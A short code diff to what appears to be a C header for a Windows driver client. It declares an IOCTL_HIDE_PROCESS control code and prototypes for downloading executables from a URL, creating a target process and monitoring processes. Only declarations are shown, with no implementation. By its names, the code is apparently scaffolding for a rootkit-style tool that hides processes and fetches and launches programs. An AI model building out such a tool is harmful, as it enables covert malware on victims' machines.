@@ -18,6 +18,11 @@
 #define IOCTL_HIDE_PROCESS \
 		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+NTSTATUS CreateTargetProcess(
+	_In_  UNICODE_STRING ImagePath,
+	_Out_ PHANDLE HandlePtr
+);
+
 BOOLEAN ConnectDriver(
 	_In_		DWORD  DwIoControlCode,
 	_In_opt_	LPVOID InBuffer,
@@ -26,15 +31,15 @@ BOOLEAN ConnectDriver(
 	_In_opt_	DWORD  OutBufferSize
 );
 
+BOOLEAN DownloadExecutable(
+	_In_ CONST CHAR* URL,
+	_In_ CONST CHAR* FilePath
+);
+
 BOOLEAN IsProcessRunning(
 	_In_ DWORD ProcessID
 );
 
 BOOLEAN MonitorProcess(
 	_In_ DWORD ProcessID
-);
-
-BOOLEAN DownloadExecutable(
-	_In_ CONST CHAR* URL,
-	_In_ CONST CHAR* FilePath
 );
